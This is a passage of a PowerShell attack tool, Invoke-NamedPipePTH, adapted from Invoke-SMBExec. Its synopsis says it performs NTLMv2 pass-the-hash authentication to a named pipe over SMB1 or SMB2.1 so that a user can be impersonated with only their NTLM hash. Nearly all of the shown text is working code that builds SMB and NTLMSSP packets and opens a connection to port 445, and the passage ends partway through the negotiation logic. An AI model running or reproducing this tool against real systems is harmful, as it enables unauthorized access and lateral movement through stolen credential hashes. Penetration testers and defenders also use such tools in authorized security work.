function Invoke-NamedPipePTH
{
<#
.SYNOPSIS
Invoke-NamedPipePTH is a big copy & paste project from Invoke-SMBExec (https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-SMBExec.ps1) written by Kevin Robertson (@kevin_robertson) with slight modifications. It performs NTLMv2 pass the hash authentication to a named pipe. This can be used to for example impersonate a user on that Pipe when only the NTLM hash is known. Invoke-NamedPipePTH
supports SMB1 and SMB2.1 with and without SMB signing.

Author: Fabian Mosch (@shitsecure)
License: BSD 3-Clause

.PARAMETER Target
Hostname or IP address of target.

.PARAMETER Username
Username to use for authentication.

.PARAMETER Domain
Domain to use for authentication. This parameter is not needed with local accounts or when using @domain after the
username.

.PARAMETER Hash
NTLM password hash for authentication. This module will accept either LM:NTLM or NTLM format.

.PARAMETER PipeName
The named pipe to access.

.PARAMETER Version
Default = Auto: (Auto,1,2.1) Force SMB version. The default behavior is to perform SMB version negotiation and use SMB2.1 if supported by the
target.


#>
[CmdletBinding(DefaultParametersetName='Default')]
param
(
    [parameter(Mandatory=$true)][String]$Target,
    [parameter(ParameterSetName='Auth',Mandatory=$true)][String]$Username,
    [parameter(ParameterSetName='Auth',Mandatory=$false)][String]$Domain,
    [parameter(Mandatory=$false)][String]$PipeName,
    [parameter(Mandatory=$false)][ValidateSet("Auto","1","2.1")][String]$Version="Auto",
    [parameter(ParameterSetName='Auth',Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash

)

if(!$Target)
{
    Write-Output "[-] Target is required when not using -Session"
    throw
}


if($Version -eq '1')
{
    $SMB_version = 'SMB1'
}
elseif($Version -eq '2.1')
{
    $SMB_version = 'SMB2.1'
}

if($PsCmdlet.ParameterSetName -ne 'Auth' -and $PsCmdlet.ParameterSetName -ne 'Session')
{
    $signing_check = $true
}

function ConvertFrom-PacketOrderedDictionary
{
    param($OrderedDictionary)

    ForEach($field in $OrderedDictionary.Values)
    {
        $byte_array += $field
    }

    return $byte_array
}

#NetBIOS

function New-PacketNetBIOSSessionService
{
    param([Int]$HeaderLength,[Int]$DataLength)

    [Byte[]]$length = ([System.BitConverter]::GetBytes($HeaderLength + $DataLength))[2..0]

    $NetBIOSSessionService = New-Object System.Collections.Specialized.OrderedDictionary
    $NetBIOSSessionService.Add("MessageType",[Byte[]](0x00))
    $NetBIOSSessionService.Add("Length",$length)

    return $NetBIOSSessionService
}

#SMB1

function New-PacketSMBHeader
{
    param([Byte[]]$Command,[Byte[]]$Flags,[Byte[]]$Flags2,[Byte[]]$TreeID,[Byte[]]$ProcessID,[Byte[]]$UserID)

    $ProcessID = $ProcessID[0,1]

    $SMBHeader = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBHeader.Add("Protocol",[Byte[]](0xff,0x53,0x4d,0x42))
    $SMBHeader.Add("Command",$Command)
    $SMBHeader.Add("ErrorClass",[Byte[]](0x00))
    $SMBHeader.Add("Reserved",[Byte[]](0x00))
    $SMBHeader.Add("ErrorCode",[Byte[]](0x00,0x00))
    $SMBHeader.Add("Flags",$Flags)
    $SMBHeader.Add("Flags2",$Flags2)
    $SMBHeader.Add("ProcessIDHigh",[Byte[]](0x00,0x00))
    $SMBHeader.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMBHeader.Add("Reserved2",[Byte[]](0x00,0x00))
    $SMBHeader.Add("TreeID",$TreeID)
    $SMBHeader.Add("ProcessID",$ProcessID)
    $SMBHeader.Add("UserID",$UserID)
    $SMBHeader.Add("MultiplexID",[Byte[]](0x00,0x00))

    return $SMBHeader
}
function New-PacketSMBNegotiateProtocolRequest
{
    param([String]$Version)

    if($Version -eq 'SMB1')
    {
        [Byte[]]$byte_count = 0x0c,0x00
    }
    else
    {
        [Byte[]]$byte_count = 0x22,0x00  
    }

    $SMBNegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBNegotiateProtocolRequest.Add("WordCount",[Byte[]](0x00))
    $SMBNegotiateProtocolRequest.Add("ByteCount",$byte_count)
    $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat",[Byte[]](0x02))
    $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name",[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))

    if($version -ne 'SMB1')
    {
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat2",[Byte[]](0x02))
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name2",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat3",[Byte[]](0x02))
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name3",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))
    }

    return $SMBNegotiateProtocolRequest
}

function New-PacketSMBSessionSetupAndXRequest
{
    param([Byte[]]$SecurityBlob)

    [Byte[]]$byte_count = [System.BitConverter]::GetBytes($SecurityBlob.Length)[0,1]
    [Byte[]]$security_blob_length = [System.BitConverter]::GetBytes($SecurityBlob.Length + 5)[0,1]

    $SMBSessionSetupAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBSessionSetupAndXRequest.Add("WordCount",[Byte[]](0x0c))
    $SMBSessionSetupAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $SMBSessionSetupAndXRequest.Add("Reserved",[Byte[]](0x00))
    $SMBSessionSetupAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $SMBSessionSetupAndXRequest.Add("MaxBuffer",[Byte[]](0xff,0xff))
    $SMBSessionSetupAndXRequest.Add("MaxMpxCount",[Byte[]](0x02,0x00))
    $SMBSessionSetupAndXRequest.Add("VCNumber",[Byte[]](0x01,0x00))
    $SMBSessionSetupAndXRequest.Add("SessionKey",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBSessionSetupAndXRequest.Add("SecurityBlobLength",$byte_count)
    $SMBSessionSetupAndXRequest.Add("Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBSessionSetupAndXRequest.Add("Capabilities",[Byte[]](0x44,0x00,0x00,0x80))
    $SMBSessionSetupAndXRequest.Add("ByteCount",$security_blob_length)
    $SMBSessionSetupAndXRequest.Add("SecurityBlob",$SecurityBlob)
    $SMBSessionSetupAndXRequest.Add("NativeOS",[Byte[]](0x00,0x00,0x00))
    $SMBSessionSetupAndXRequest.Add("NativeLANManage",[Byte[]](0x00,0x00))

    return $SMBSessionSetupAndXRequest 
}

function New-PacketSMBTreeConnectAndXRequest
{
    param([Byte[]]$Path)

    [Byte[]]$path_length = $([System.BitConverter]::GetBytes($Path.Length + 7))[0,1]

    $SMBTreeConnectAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBTreeConnectAndXRequest.Add("WordCount",[Byte[]](0x04))
    $SMBTreeConnectAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $SMBTreeConnectAndXRequest.Add("Reserved",[Byte[]](0x00))
    $SMBTreeConnectAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $SMBTreeConnectAndXRequest.Add("Flags",[Byte[]](0x00,0x00))
    $SMBTreeConnectAndXRequest.Add("PasswordLength",[Byte[]](0x01,0x00))
    $SMBTreeConnectAndXRequest.Add("ByteCount",$path_length)
    $SMBTreeConnectAndXRequest.Add("Password",[Byte[]](0x00))
    $SMBTreeConnectAndXRequest.Add("Tree",$Path)
    $SMBTreeConnectAndXRequest.Add("Service",[Byte[]](0x3f,0x3f,0x3f,0x3f,0x3f,0x00))

    return $SMBTreeConnectAndXRequest
}

function New-PacketSMBNTCreateAndXRequest
{
    param([Byte[]]$NamedPipe)

    [Byte[]]$named_pipe_length = $([System.BitConverter]::GetBytes($NamedPipe.Length))[0,1]
    [Byte[]]$file_name_length = $([System.BitConverter]::GetBytes($NamedPipe.Length - 1))[0,1]

    $SMBNTCreateAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBNTCreateAndXRequest.Add("WordCount",[Byte[]](0x18))
    $SMBNTCreateAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $SMBNTCreateAndXRequest.Add("Reserved",[Byte[]](0x00))
    $SMBNTCreateAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $SMBNTCreateAndXRequest.Add("Reserved2",[Byte[]](0x00))
    $SMBNTCreateAndXRequest.Add("FileNameLen",$file_name_length)
    $SMBNTCreateAndXRequest.Add("CreateFlags",[Byte[]](0x16,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("RootFID",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("AccessMask",[Byte[]](0x00,0x00,0x00,0x02))
    $SMBNTCreateAndXRequest.Add("AllocationSize",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("FileAttributes",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("ShareAccess",[Byte[]](0x07,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("Disposition",[Byte[]](0x01,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("CreateOptions",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("Impersonation",[Byte[]](0x02,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("SecurityFlags",[Byte[]](0x00))
    $SMBNTCreateAndXRequest.Add("ByteCount",$named_pipe_length)
    $SMBNTCreateAndXRequest.Add("Filename",$NamedPipe)

    return $SMBNTCreateAndXRequest
}

function New-PacketSMBReadAndXRequest
{
    $SMBReadAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBReadAndXRequest.Add("WordCount",[Byte[]](0x0a))
    $SMBReadAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $SMBReadAndXRequest.Add("Reserved",[Byte[]](0x00))
    $SMBReadAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $SMBReadAndXRequest.Add("FID",[Byte[]](0x00,0x40))
    $SMBReadAndXRequest.Add("Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBReadAndXRequest.Add("MaxCountLow",[Byte[]](0x58,0x02))
    $SMBReadAndXRequest.Add("MinCount",[Byte[]](0x58,0x02))
    $SMBReadAndXRequest.Add("Unknown",[Byte[]](0xff,0xff,0xff,0xff))
    $SMBReadAndXRequest.Add("Remaining",[Byte[]](0x00,0x00))
    $SMBReadAndXRequest.Add("ByteCount",[Byte[]](0x00,0x00))

    return $SMBReadAndXRequest
}

function New-PacketSMBWriteAndXRequest
{
    param([Byte[]]$FileID,[Int]$Length)

    [Byte[]]$write_length = [System.BitConverter]::GetBytes($Length)[0,1]

    $SMBWriteAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBWriteAndXRequest.Add("WordCount",[Byte[]](0x0e))
    $SMBWriteAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $SMBWriteAndXRequest.Add("Reserved",[Byte[]](0x00))
    $SMBWriteAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $SMBWriteAndXRequest.Add("FID",$FileID)
    $SMBWriteAndXRequest.Add("Offset",[Byte[]](0xea,0x03,0x00,0x00))
    $SMBWriteAndXRequest.Add("Reserved2",[Byte[]](0xff,0xff,0xff,0xff))
    $SMBWriteAndXRequest.Add("WriteMode",[Byte[]](0x08,0x00))
    $SMBWriteAndXRequest.Add("Remaining",$write_length)
    $SMBWriteAndXRequest.Add("DataLengthHigh",[Byte[]](0x00,0x00))
    $SMBWriteAndXRequest.Add("DataLengthLow",$write_length)
    $SMBWriteAndXRequest.Add("DataOffset",[Byte[]](0x3f,0x00))
    $SMBWriteAndXRequest.Add("HighOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBWriteAndXRequest.Add("ByteCount",$write_length)

    return $SMBWriteAndXRequest
}

function New-PacketSMBCloseRequest
{
    param ([Byte[]]$FileID)

    $SMBCloseRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBCloseRequest.Add("WordCount",[Byte[]](0x03))
    $SMBCloseRequest.Add("FID",$FileID)
    $SMBCloseRequest.Add("LastWrite",[Byte[]](0xff,0xff,0xff,0xff))
    $SMBCloseRequest.Add("ByteCount",[Byte[]](0x00,0x00))

    return $SMBCloseRequest
}

function New-PacketSMBTreeDisconnectRequest
{
    $SMBTreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBTreeDisconnectRequest.Add("WordCount",[Byte[]](0x00))
    $SMBTreeDisconnectRequest.Add("ByteCount",[Byte[]](0x00,0x00))

    return $SMBTreeDisconnectRequest
}

function New-PacketSMBLogoffAndXRequest
{
    $SMBLogoffAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBLogoffAndXRequest.Add("WordCount",[Byte[]](0x02))
    $SMBLogoffAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $SMBLogoffAndXRequest.Add("Reserved",[Byte[]](0x00))
    $SMBLogoffAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $SMBLogoffAndXRequest.Add("ByteCount",[Byte[]](0x00,0x00))

    return $SMBLogoffAndXRequest
}

#SMB2

function New-PacketSMB2Header
{
    param([Byte[]]$Command,[Byte[]]$CreditRequest,[Bool]$Signing,[Int]$MessageID,[Byte[]]$ProcessID,[Byte[]]$TreeID,[Byte[]]$SessionID)

    if($Signing)
    {
        $flags = 0x08,0x00,0x00,0x00      
    }
    else
    {
        $flags = 0x00,0x00,0x00,0x00
    }

    [Byte[]]$message_ID = [System.BitConverter]::GetBytes($MessageID)

    if($message_ID.Length -eq 4)
    {
        $message_ID += 0x00,0x00,0x00,0x00
    }

    $SMB2Header = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2Header.Add("ProtocolID",[Byte[]](0xfe,0x53,0x4d,0x42))
    $SMB2Header.Add("StructureSize",[Byte[]](0x40,0x00))
    $SMB2Header.Add("CreditCharge",[Byte[]](0x01,0x00))
    $SMB2Header.Add("ChannelSequence",[Byte[]](0x00,0x00))
    $SMB2Header.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2Header.Add("Command",$Command)
    $SMB2Header.Add("CreditRequest",$CreditRequest)
    $SMB2Header.Add("Flags",$flags)
    $SMB2Header.Add("NextCommand",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2Header.Add("MessageID",$message_ID)
    $SMB2Header.Add("ProcessID",$ProcessID)
    $SMB2Header.Add("TreeID",$TreeID)
    $SMB2Header.Add("SessionID",$SessionID)
    $SMB2Header.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    return $SMB2Header
}

function New-PacketSMB2NegotiateProtocolRequest
{
    $SMB2NegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2NegotiateProtocolRequest.Add("StructureSize",[Byte[]](0x24,0x00))
    $SMB2NegotiateProtocolRequest.Add("DialectCount",[Byte[]](0x02,0x00))
    $SMB2NegotiateProtocolRequest.Add("SecurityMode",[Byte[]](0x01,0x00))
    $SMB2NegotiateProtocolRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("Capabilities",[Byte[]](0x40,0x00,0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("ClientGUID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("NegotiateContextOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("NegotiateContextCount",[Byte[]](0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("Reserved2",[Byte[]](0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("Dialect",[Byte[]](0x02,0x02))
    $SMB2NegotiateProtocolRequest.Add("Dialect2",[Byte[]](0x10,0x02))

    return $SMB2NegotiateProtocolRequest
}

function New-PacketSMB2SessionSetupRequest
{
    param([Byte[]]$SecurityBlob)

    [Byte[]]$security_buffer_length = ([System.BitConverter]::GetBytes($SecurityBlob.Length))[0,1]

    $SMB2SessionSetupRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2SessionSetupRequest.Add("StructureSize",[Byte[]](0x19,0x00))
    $SMB2SessionSetupRequest.Add("Flags",[Byte[]](0x00))
    $SMB2SessionSetupRequest.Add("SecurityMode",[Byte[]](0x01))
    $SMB2SessionSetupRequest.Add("Capabilities",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2SessionSetupRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2SessionSetupRequest.Add("SecurityBufferOffset",[Byte[]](0x58,0x00))
    $SMB2SessionSetupRequest.Add("SecurityBufferLength",$security_buffer_length)
    $SMB2SessionSetupRequest.Add("PreviousSessionID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2SessionSetupRequest.Add("Buffer",$SecurityBlob)

    return $SMB2SessionSetupRequest 
}

function New-PacketSMB2TreeConnectRequest
{
    param([Byte[]]$Buffer)

    [Byte[]]$path_length = ([System.BitConverter]::GetBytes($Buffer.Length))[0,1]

    $SMB2TreeConnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2TreeConnectRequest.Add("StructureSize",[Byte[]](0x09,0x00))
    $SMB2TreeConnectRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2TreeConnectRequest.Add("PathOffset",[Byte[]](0x48,0x00))
    $SMB2TreeConnectRequest.Add("PathLength",$path_length)
    $SMB2TreeConnectRequest.Add("Buffer",$Buffer)

    return $SMB2TreeConnectRequest
}

function New-PacketSMB2CreateRequestFile
{
    param([Byte[]]$NamedPipe)

    $name_length = ([System.BitConverter]::GetBytes($NamedPipe.Length))[0,1]

    $SMB2CreateRequestFile = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2CreateRequestFile.Add("StructureSize",[Byte[]](0x39,0x00))
    $SMB2CreateRequestFile.Add("Flags",[Byte[]](0x00))
    $SMB2CreateRequestFile.Add("RequestedOplockLevel",[Byte[]](0x00))
    $SMB2CreateRequestFile.Add("Impersonation",[Byte[]](0x02,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("SMBCreateFlags",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("DesiredAccess",[Byte[]](0x03,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("FileAttributes",[Byte[]](0x80,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("ShareAccess",[Byte[]](0x01,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("CreateDisposition",[Byte[]](0x01,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("CreateOptions",[Byte[]](0x40,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("NameOffset",[Byte[]](0x78,0x00))
    $SMB2CreateRequestFile.Add("NameLength",$name_length)
    $SMB2CreateRequestFile.Add("CreateContextsOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("CreateContextsLength",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("Buffer",$NamedPipe)

    return $SMB2CreateRequestFile
}

function New-PacketSMB2ReadRequest
{
    param ([Byte[]]$FileID)

    $SMB2ReadRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2ReadRequest.Add("StructureSize",[Byte[]](0x31,0x00))
    $SMB2ReadRequest.Add("Padding",[Byte[]](0x50))
    $SMB2ReadRequest.Add("Flags",[Byte[]](0x00))
    $SMB2ReadRequest.Add("Length",[Byte[]](0x00,0x00,0x10,0x00))
    $SMB2ReadRequest.Add("Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("FileID",$FileID)
    $SMB2ReadRequest.Add("MinimumCount",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("ReadChannelInfoOffset",[Byte[]](0x00,0x00))
    $SMB2ReadRequest.Add("ReadChannelInfoLength",[Byte[]](0x00,0x00))
    $SMB2ReadRequest.Add("Buffer",[Byte[]](0x30))

    return $SMB2ReadRequest
}

function New-PacketSMB2WriteRequest
{
    param([Byte[]]$FileID,[Int]$RPCLength)

    [Byte[]]$write_length = [System.BitConverter]::GetBytes($RPCLength)

    $SMB2WriteRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2WriteRequest.Add("StructureSize",[Byte[]](0x31,0x00))
    $SMB2WriteRequest.Add("DataOffset",[Byte[]](0x70,0x00))
    $SMB2WriteRequest.Add("Length",$write_length)
    $SMB2WriteRequest.Add("Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2WriteRequest.Add("FileID",$FileID)
    $SMB2WriteRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2WriteRequest.Add("RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2WriteRequest.Add("WriteChannelInfoOffset",[Byte[]](0x00,0x00))
    $SMB2WriteRequest.Add("WriteChannelInfoLength",[Byte[]](0x00,0x00))
    $SMB2WriteRequest.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))

    return $SMB2WriteRequest
}

function New-PacketSMB2CloseRequest
{
    param ([Byte[]]$FileID)

    $SMB2CloseRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2CloseRequest.Add("StructureSize",[Byte[]](0x18,0x00))
    $SMB2CloseRequest.Add("Flags",[Byte[]](0x00,0x00))
    $SMB2CloseRequest.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2CloseRequest.Add("FileID",$FileID)

    return $SMB2CloseRequest
}

function New-PacketSMB2TreeDisconnectRequest
{
    $SMB2TreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2TreeDisconnectRequest.Add("StructureSize",[Byte[]](0x04,0x00))
    $SMB2TreeDisconnectRequest.Add("Reserved",[Byte[]](0x00,0x00))

    return $SMB2TreeDisconnectRequest
}

function New-PacketSMB2SessionLogoffRequest
{
    $SMB2SessionLogoffRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2SessionLogoffRequest.Add("StructureSize",[Byte[]](0x04,0x00))
    $SMB2SessionLogoffRequest.Add("Reserved",[Byte[]](0x00,0x00))

    return $SMB2SessionLogoffRequest
}

#NTLM

function New-PacketNTLMSSPNegotiate
{
    param([Byte[]]$NegotiateFlags,[Byte[]]$Version)

    [Byte[]]$NTLMSSP_length = ([System.BitConverter]::GetBytes($Version.Length + 32))[0]
    [Byte[]]$ASN_length_1 = $NTLMSSP_length[0] + 32
    [Byte[]]$ASN_length_2 = $NTLMSSP_length[0] + 22
    [Byte[]]$ASN_length_3 = $NTLMSSP_length[0] + 20
    [Byte[]]$ASN_length_4 = $NTLMSSP_length[0] + 2

    $NTLMSSPNegotiate = New-Object System.Collections.Specialized.OrderedDictionary
    $NTLMSSPNegotiate.Add("InitialContextTokenID",[Byte[]](0x60))
    $NTLMSSPNegotiate.Add("InitialcontextTokenLength",$ASN_length_1)
    $NTLMSSPNegotiate.Add("ThisMechID",[Byte[]](0x06))
    $NTLMSSPNegotiate.Add("ThisMechLength",[Byte[]](0x06))
    $NTLMSSPNegotiate.Add("OID",[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))
    $NTLMSSPNegotiate.Add("InnerContextTokenID",[Byte[]](0xa0))
    $NTLMSSPNegotiate.Add("InnerContextTokenLength",$ASN_length_2)
    $NTLMSSPNegotiate.Add("InnerContextTokenID2",[Byte[]](0x30))
    $NTLMSSPNegotiate.Add("InnerContextTokenLength2",$ASN_length_3)
    $NTLMSSPNegotiate.Add("MechTypesID",[Byte[]](0xa0))
    $NTLMSSPNegotiate.Add("MechTypesLength",[Byte[]](0x0e))
    $NTLMSSPNegotiate.Add("MechTypesID2",[Byte[]](0x30))
    $NTLMSSPNegotiate.Add("MechTypesLength2",[Byte[]](0x0c))
    $NTLMSSPNegotiate.Add("MechTypesID3",[Byte[]](0x06))
    $NTLMSSPNegotiate.Add("MechTypesLength3",[Byte[]](0x0a))
    $NTLMSSPNegotiate.Add("MechType",[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))
    $NTLMSSPNegotiate.Add("MechTokenID",[Byte[]](0xa2))
    $NTLMSSPNegotiate.Add("MechTokenLength",$ASN_length_4)
    $NTLMSSPNegotiate.Add("NTLMSSPID",[Byte[]](0x04))
    $NTLMSSPNegotiate.Add("NTLMSSPLength",$NTLMSSP_length)
    $NTLMSSPNegotiate.Add("Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
    $NTLMSSPNegotiate.Add("MessageType",[Byte[]](0x01,0x00,0x00,0x00))
    $NTLMSSPNegotiate.Add("NegotiateFlags",$NegotiateFlags)
    $NTLMSSPNegotiate.Add("CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $NTLMSSPNegotiate.Add("CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    if($Version)
    {
        $NTLMSSPNegotiate.Add("Version",$Version)
    }

    return $NTLMSSPNegotiate
}

function New-PacketNTLMSSPAuth
{
    param([Byte[]]$NTLMResponse)

    [Byte[]]$NTLMSSP_length = ([System.BitConverter]::GetBytes($NTLMResponse.Length))[1,0]
    [Byte[]]$ASN_length_1 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 12))[1,0]
    [Byte[]]$ASN_length_2 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 8))[1,0]
    [Byte[]]$ASN_length_3 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 4))[1,0]

    $NTLMSSPAuth = New-Object System.Collections.Specialized.OrderedDictionary
    $NTLMSSPAuth.Add("ASNID",[Byte[]](0xa1,0x82))
    $NTLMSSPAuth.Add("ASNLength",$ASN_length_1)
    $NTLMSSPAuth.Add("ASNID2",[Byte[]](0x30,0x82))
    $NTLMSSPAuth.Add("ASNLength2",$ASN_length_2)
    $NTLMSSPAuth.Add("ASNID3",[Byte[]](0xa2,0x82))
    $NTLMSSPAuth.Add("ASNLength3",$ASN_length_3)
    $NTLMSSPAuth.Add("NTLMSSPID",[Byte[]](0x04,0x82))
    $NTLMSSPAuth.Add("NTLMSSPLength",$NTLMSSP_length)
    $NTLMSSPAuth.Add("NTLMResponse",$NTLMResponse)

    return $NTLMSSPAuth
}


function Get-StatusPending
{
    param ([Byte[]]$Status)

    if([System.BitConverter]::ToString($Status) -eq '03-01-00-00')
    {
        $status_pending = $true
    }

    return $status_pending
}

function Get-UInt16DataLength
{
    param ([Int]$Start,[Byte[]]$Data)

    $data_length = [System.BitConverter]::ToUInt16($Data[$Start..($Start + 1)],0)

    return $data_length
}

if($hash -like "*:*")
{
    $hash = $hash.SubString(($hash.IndexOf(":") + 1),32)
}

if($Domain)
{
    $output_username = $Domain + "\" + $Username
}
else
{
    $output_username = $Username
}

$process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id
$process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))
[Byte[]]$process_ID = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

$client = New-Object System.Net.Sockets.TCPClient
$client.Client.ReceiveTimeout = 60000


if(!$startup_error)
{

    try
    {
        $client.Connect($Target,"445")
    }
    catch
    {
        Write-Output "[-] $Target did not respond"
    }

}

if($client.Connected -or (!$startup_error))
{
    Write-Verbose "Connection established"
    $client_receive = New-Object System.Byte[] 1024

        $client_stream = $client.GetStream()

        if($SMB_version -eq 'SMB2.1')
        {
            $stage = 'NegotiateSMB2'
        }
        else
        {
            $stage = 'NegotiateSMB'
        }

        while($stage -ne 'Exit')
        {

            try
            {

                switch ($stage)
                {

                    'NegotiateSMB'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x72 0x18 0x01,0x48 0xff,0xff $process_ID 0x00,0x00
                        $packet_SMB_data = New-PacketSMBNegotiateProtocolRequest $SMB_version
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

                        try
                        {    
                            $client_stream.Write($client_send,0,$client_send.Length) > $null
                            $client_stream.Flush()
                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                            if([System.BitConverter]::ToString($client_receive[4..7]) -eq 'ff-53-4d-42')
                            {
                                $SMB_version = 'SMB1'
                                $stage = 'NTLMSSPNegotiate'

                                if([System.BitConverter]::ToString($client_receive[39]) -eq '0f')
                                {

                                    if($signing_check)
